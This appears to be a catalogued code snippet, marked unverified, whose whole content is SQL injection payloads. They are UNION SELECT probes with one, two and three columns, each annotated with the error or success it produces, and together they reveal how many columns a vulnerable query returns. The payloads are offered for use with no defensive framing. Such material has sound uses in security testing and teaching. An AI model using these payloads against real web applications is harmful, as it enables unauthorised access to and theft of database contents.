---
id: 2c45a9c8-951e-4d74-8d05-21112f3c4d74
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.306179+00:00'
updated_at: '2023-04-10T20:22:52.763311+00:00'
---

# Code Snippet 2c45a9c8

**Language**: SQL

```sql
1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@--+    #No error means query uses 3 column
                            #-1' UNION SELECT 1,2,3--+	True
```
